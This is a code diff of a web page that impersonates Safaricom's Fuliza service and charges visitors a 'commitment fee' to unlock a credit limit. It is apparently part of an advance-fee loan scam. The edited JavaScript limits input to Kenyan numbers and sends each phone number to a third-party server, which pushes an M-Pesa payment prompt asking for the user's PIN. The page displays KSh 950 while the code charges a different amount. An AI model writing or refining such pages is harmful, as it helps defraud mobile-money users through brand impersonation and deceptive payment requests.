@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Commitment Fee Payment</title>
-
 <style>
 body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
 .top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
@@ -20,13 +19,11 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 .encourage{margin-top:15px;font-size:14px;color:#555;}
 </style>
 </head>
-
 <body>
 
 <header class="top-bar">Safaricom Fuliza Verification</header>
 
 <div class="payment-box">
-
 <h2>Customer Commitment Fee</h2>
 
 <p class="encourage">
@@ -38,7 +35,7 @@ This confirms your request and allows our system to automatically refresh your l
 <div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
 <div class="info">Your Commitment Fee: <strong>KSh 950</strong></div>
 
-<input type="tel" id="phone" placeholder="Enter phone number with country code e.g. +2547XXXXXXX">
+<input type="tel" id="phone" placeholder="Enter Kenyan phone number (+2547XXXXXXX)">
 
 <button class="pay-btn" onclick="payNow()">Pay KSh 950 Now</button>
 
@@ -48,155 +45,124 @@ This confirms your request and allows our system to automatically refresh your l
 <p class="encourage">
 Complete this step to proceed to the <b>final Fuliza activation stage</b>.
 </p>
-
 </div>
 
 <script>
-
 // Get selected amount
 const selectedAmount = localStorage.getItem("selectedAmount") || "0";
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-// Commitment fee
-const commitmentFee = 20;
+// Correct commitment fee
+const commitmentFee = 14;
 
-// Supported countries & networks
-const countryPrefixes = {
-  '254':'KE',
-  '256':'UG',
-  '255':'TZ',
-  '260':'ZM'
-};
-
-const defaultNetwork = {
-  'KE':'MPESA',
-  'UG':'MTN',
-  'TZ':'TIGO',
-  'ZM':'ZAMTEL'
-};
-
-// Format phone for API
-function formatPhone(number, country){
-  number = number.trim();
-  if(country==='KE'){
-    // Convert 07xxxxxxx or 01xxxxxxx to 2547xxxxxxx
-    if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
-    if(number.startsWith('+254')) return '254' + number.substring(4);
-    if(number.startsWith('0')) return '254' + number.substring(1);
-  }
-  return number.startsWith('+') ? number.substring(1) : number;
+// Kenya-only validation
+function normalizePhone(phone){
+    phone = phone.trim();
+    if(phone.startsWith('+254')) return phone;
+    if(phone.startsWith('07') || phone.startsWith('01')) return '+254' + phone.substring(1);
+    if(phone.startsWith('254')) return '+' + phone;
+    return null;
 }
 
-// Detect country from phone
-function detectCountry(number){
-  number = number.trim();
-  if(number.startsWith('07') || number.startsWith('01')) return 'KE'; // auto Kenya
-  if(number.startsWith('+')) number = number.substring(1);
-  const prefix = number.substring(0,3);
-  return countryPrefixes[prefix] || '';
+function isValidPhone(phone){
+    const normalized = normalizePhone(phone);
+    return normalized && /^\+2547[0-9]{8}$/.test(normalized);
 }
 
-// Validate phone number
-function isValidPhone(number){
-  return number && (number.startsWith('07') || number.startsWith('01') || /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number));
+function setButtonState(enabled){
+    document.querySelector(".pay-btn").disabled = !enabled;
 }
 
 async function payNow(){
+    const phoneInput = document.getElementById("phone").value.trim();
+    const msg = document.getElementById("message");
+    const spinner = document.getElementById("spinner");
 
-  const phoneInput = document.getElementById("phone").value.trim();
-  const msg = document.getElementById("message");
-  const spinner = document.getElementById("spinner");
+    msg.innerText = "";
+    const phoneToSend = normalizePhone(phoneInput);
 
-  msg.innerText = "";
-  spinner.style.display = "none";
-
-  if(!phoneInput){
-    msg.innerText="Enter your phone number";
-    msg.style.color="red";
-    return;
-  }
-
-  if(!isValidPhone(phoneInput)){
-    msg.innerText="Invalid phone number. Include country code or start with 07/01 for Kenya.";
-    msg.style.color="red";
-    return;
-  }
-
-  const country = detectCountry(phoneInput);
-  const phoneToSend = formatPhone(phoneInput, country);
-  const network = defaultNetwork[country];
-
-  spinner.style.display="block";
-  msg.innerText="Waiting for STK Push to be initiated... please check your phone";
-  msg.style.color="black";
-
-  try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        phone_number: phoneToSend,
-        amount: commitmentFee,
-        country: country,
-        network: network
-      })
-    });
-
-    const data = await res.json();
-    spinner.style.display="none";
-
-    if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm";
-      msg.style.color="green";
-      checkPayment(data.reference,"payment4.html");
-    } else {
-      msg.innerText="Payment failed: "+(data.message || "Try again");
-      msg.style.color="red";
+    if(!phoneToSend || !isValidPhone(phoneInput)){
+        msg.innerText="Invalid Kenyan number. Use 07xxxxxxxx or +2547xxxxxxxx format.";
+        msg.style.color="red";
+        return;
     }
 
-  } catch(err){
-    spinner.style.display="none";
-    msg.innerText="Server error: "+(err.message || "Try again");
-    msg.style.color="red";
-  }
+    spinner.style.display="block";
+    setButtonState(false);
+    msg.innerText="Waiting for STK Push... please check your phone.";
+    msg.style.color="black";
+
+    try{
+        const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                phone_number: phoneToSend,
+                amount: commitmentFee,
+                country: 'KE',
+                network: 'MPESA'
+            })
+        });
+
+        const data = await res.json();
+        spinner.style.display="none";
+
+        if(data.success){
+            msg.innerText="STK Push sent ✅ Enter your mobile money PIN...";
+            msg.style.color="green";
+            checkPayment(data.reference,"payment4.html");
+        } else {
+            msg.innerText="Payment failed: "+(data.message || "Try again");
+            msg.style.color="red";
+            setButtonState(true);
+        }
+
+    } catch(err){
+        spinner.style.display="none";
+        msg.innerText="Server error: "+(err.message || "Try again");
+        msg.style.color="red";
+        setButtonState(true);
+    }
 }
 
 async function checkPayment(reference, nextPage){
-  const msg=document.getElementById("message");
-  let attempts=0;
+    const msg=document.getElementById("message");
+    let attempts=0;
 
-  const interval=setInterval(async()=>{
-    attempts++;
-    if(attempts>40){
-      clearInterval(interval);
-      msg.innerText="Payment timeout. Please retry.";
-      msg.style.color="red";
-      return;
-    }
-
-    try{
-      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
-      const data = await res.json();
-      if(data.success && data.data){
-        const status = data.data.status.toLowerCase();
-
-        if(status==="success" || status==="processing"){
-          clearInterval(interval);
-          msg.innerText="Commitment fee received successfully ✅ Redirecting...";
-          msg.style.color="green";
-          setTimeout(()=>{ window.location.href = nextPage },2000);
+    const interval=setInterval(async()=>{
+        attempts++;
+        if(attempts>40){
+            clearInterval(interval);
+            msg.innerText="Payment timeout. Please retry.";
+            msg.style.color="red";
+            setButtonState(true);
+            return;
         }
 
-        if(status==="failed" || status==="cancelled" || status==="error"){
-          clearInterval(interval);
-          msg.innerText="Payment failed. Please try again.";
-          msg.style.color="red";
-        }
-      }
-    }catch(e){}
-  },3000);
+        try{
+            const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+            const data = await res.json();
+            if(data.success && data.data){
+                const status = data.data.status.toLowerCase();
+
+                if(status==="success" || status==="processing"){
+                    clearInterval(interval);
+                    msg.innerText="Commitment fee received ✅ Redirecting...";
+                    msg.style.color="green";
+                    setTimeout(()=>{ window.location.href = nextPage },2000);
+                } else if(status==="failed" || status==="cancelled"){
+                    clearInterval(interval);
+                    msg.innerText="Payment failed. Please try again.";
+                    msg.style.color="red";
+                    setButtonState(true);
+                } else if(status==="pending"){
+                    msg.innerText="Payment pending... please check your phone.";
+                    msg.style.color="black";
+                }
+            }
+        }catch(e){}
+    },3000);
 }
-
 </script>
 
 </body>
